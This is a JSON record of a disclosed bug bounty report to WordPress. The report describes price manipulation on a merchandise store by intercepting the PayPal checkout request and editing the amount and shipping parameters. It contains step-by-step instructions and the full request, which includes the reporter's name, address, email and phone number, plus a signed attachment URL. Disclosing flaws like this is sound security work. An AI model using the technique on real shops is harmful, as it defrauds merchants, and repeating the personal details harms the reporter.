@@ -1,0 +1,119 @@
+{
+  "id": 682344,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82ODIzNDQ=",
+  "url": "https://hackerone.com/reports/682344",
+  "title": "Parameter tampering : Price Manipulation of Products",
+  "state": "Closed",
+  "substate": "duplicate",
+  "readable_substate": "Duplicate",
+  "created_at": "2019-08-26T19:17:18.147Z",
+  "submitted_at": "2019-08-26T19:17:18.147Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "ashketchum",
+    "url": "/ashketchum",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/tqhz5h0mhlyubou44ch6hpiurnju/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 55,
+    "url": "https://hackerone.com/wordpress",
+    "handle": "wordpress",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "WordPress",
+      "twitter_handle": "wordpress",
+      "website": "https://wordpress.org/",
+      "about": "Beautiful sites of any kind."
+    }
+  },
+  "has_bounty?": false,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2019-08-29T15:39:07.475Z",
+  "bug_reporter_agreed_on_going_public_at": "2019-08-27T00:48:43.899Z",
+  "team_member_agreed_on_going_public_at": "2019-08-29T15:39:07.407Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hello Security Team,\nI have found that you can buy any products in less amount or even we can say as free by changing the price of the product!!\n\nPOC : \n1) go to https://mercantile.wordpress.org/\n2) choose any product and add to cart\n3) Now go to cart add your billing details \n4) Intercept request with burpsuite and click on Proceed to Paypal\n5) You will get the following request\n\nREQUEST :\n\nGET /cgi-bin/webscr?cmd=_cart&business=payments%40hellomerch.com&no_note=1&currency_code=USD&charset=utf-8&rm=2&upload=1&return=https%3A%2F%2Fmercantile.wordpress.org%2Fcheckout%2Forder-received%2F10446%2F%3Fkey%3Dwc_order_5d642e2e80f33%26utm_nooverride%3D1&cancel_return=https%3A%2F%2Fmercantile.wordpress.org%2Fcart%2F%3Fcancel_order%3Dtrue%26order%3Dwc_order_5d642e2e80f33%26order_id%3D10446%26redirect%26_wpnonce%3Def9aba5f0f&page_style=&image_url=&paymentaction=sale&bn=WooThemes_Cart&invoice=WP-10446&custom=%7B%22order_id%22%3A10446%2C%22order_key%22%3A%22wc_order_5d642e2e80f33%22%7D&notify_url=https%3A%2F%2Fmercantile.wordpress.org%2Fwc-api%2FWC_Gateway_Paypal%2F&first_name=ASHISH&last_name=DHONE&address1=I2IT+BOYS+HOSTEL+HINJAWADI+OPPOSITE+SYMBIOSIS+COLLEGE&address2=xss&city=PUNE&state=Maharashtra&zip=411057&country=IN&email=ha5ckdangerous5%40gmail.com&night_phone_b=7385711194&no_shipping=1&tax_cart=0.00&shipping_1=<<VULNERABLE PARAMETER>>&item_name_1=WordCamp+US+2018+T-Shirt+-+Women%27s+SM&quantity_1=1&amount_1=<<VULNERABLE PARAMETER>>&item_number_1=WP-WORDCAMPUS2018NAVY-WSM-05-106-B HTTP/1.1\nHost: www.paypal.com\nConnection: close\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\nReferer: https://mercantile.wordpress.org/checkout/\nAccept-Encoding: gzip, deflate\nAccept-Language: en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7\n\n\nNow here in this request we have two VULNERABLE PARAMETER as :\n1) shipping_1\n2) amount_1\n\nNow you change amount to this parameter and forward the request .. you will be able to order the product for less price or even Free using Paypal !!\n\nI have attached POC Video, Please take a look!!\n\nThank You!!\nAshish Dhone\n\n## Impact\n\nThe attacker can reduce the price of the order and make a financial loss!!",
+  "weakness": {
+    "id": 65,
+    "name": "Business Logic Errors"
+  },
+  "original_report_id": 271585,
+  "original_report_url": "https://hackerone.com/reports/271585",
+  "attachments": [
+    {
+      "id": 567164,
+      "file_name": "POC.mkv",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/oSKeXbWyeCJtEYrhSLksNnEp?response-content-disposition=attachment%3B%20filename%3D%22POC.mkv%22%3B%20filename%2A%3DUTF-8%27%27POC.mkv&response-content-type=video%2Fx-matroska&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQS6SCAH72%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T132714Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDu%2B5Pwo%2F34eoeVeuWsr%2Ff9B54eFSJHpHqs9we%2BjQAH6gIhALp00VqCzQ3yXDicmppc8nMEwhMltHZsqN0RcGzFE1GqKrIFCHUQAxoMMDEzNjE5Mjc0ODQ5Igwkers7f9aKGbx%2BvDcqjwVWDMAhBUKhOq6mxVC7xmKOa%2FU2AiQBQKvDNaKfEmdipLMP6n95LC8VlOQ3Ca%2B7a8IxSNPEW%2FMJrckmzRQkQn5Pvo7LyCxG1l6k7KZzOYPdFRTU7P2FcXBvM6OhRy8ERlHZ1Ufnved4qCHN0953KV512I88RdKF2UQ9KA9EEzg3ey2SzXbnBk2JKsmpPRc0sUDb4ZMn4GDyk%2B2mbDjFILmQt6lr%2B6v0UoAJ%2B7v4%2F%2F852Q6Ruj9P1iez9HOSmDy3175zVvNBeZ4WctM1b8jW6o%2BmI4wZT%2FgWlgSufI1k6yaDWkc%2FE3Bn%2BpLvQoQXU80KrdN1Yr3AjY%2BuRyqxmectMc5y%2Br2%2F%2FwomOAO3I7t5j85rAvGeCLnU1ZAYisFSaSSgAJ%2BfsZD3xX9YCITIgC401%2F5etOaBcdLCaIxhXTp4wk5QS7eRBWvkzPZGEUcM52Rtz1NPZ0uXWarmK9P4ZIqYLWu82nHAH0wf3c3zd07rclVWahRXRkxP0wL3906s66oMXu%2FAgOj02dajNNZpgK8AaMKZXh5LU98RMkHWul32xDirzkDtJ6wBhMOXNHeLLut%2FijTOpDPFtCEBcHCr43hYLb1oSRkvigVVHtwhd%2BDjkszCy1F3hxu7H2ujIa9DoZ20hfrH4QAdqgLvpCC5kvd9Mdm9%2Fx13AdQjdUqxw2uU5HHCcUUMvji7mFcM0YKL33beYGIrXk5AJSUULfcFoq3Vln%2FoLmEL9STeERNxXuI9ijvLiCJCbUpcqNlCitD7ewAHGbNSSxgqcuRKjxMizmXSxM5uuuRQlbl7%2BOU8q4LcVoDIFjj15cH0GRJIGCdM2OT1aQG%2F%2FURgsiaYaysR3DfHV5zWoNx%2FNh%2FdRuvtdIdbsxviMKq0ra4GOrABb%2BYWX5qJazI%2FwiuYHFwT6C%2FymmUklRtb8O7FwtNQp8ZsagCHes2g1O8LOYf5T0%2FOXV0bp7oUjKh25bYYogztfc9XxMWj9SG%2BcrOe8OCs8YNKO4wu1gapV5ceXDZq%2FbF7bPsNEkzubLAYNEzVpO8uqKPZd6oKWBP%2Frue89n87JX%2FKDXf2RuT5sO6X4%2FoVBQryJS%2B7K2SqOzxLHHOKg0mmsmeYRh0fWGzJhtEb%2B0a4xOk%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a9846fae6d712292463662ddac87292981d0a6e73095d18dc421dd5fead3b4f5",
+      "file_size": 8292935,
+      "type": "video/x-matroska",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 7,
+  "voters": [
+    "sameerphad72",
+    "premium101",
+    "hemanthrose",
+    "yogesh1522",
+    "0xcyber-pirate",
+    "kingxol",
+    "sandeshkhadase05"
+  ],
+  "structured_scope": {
+    "databaseId": 2758,
+    "asset_type": "URL",
+    "asset_identifier": "mercantile.wordpress.org",
+    "max_severity": "medium"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
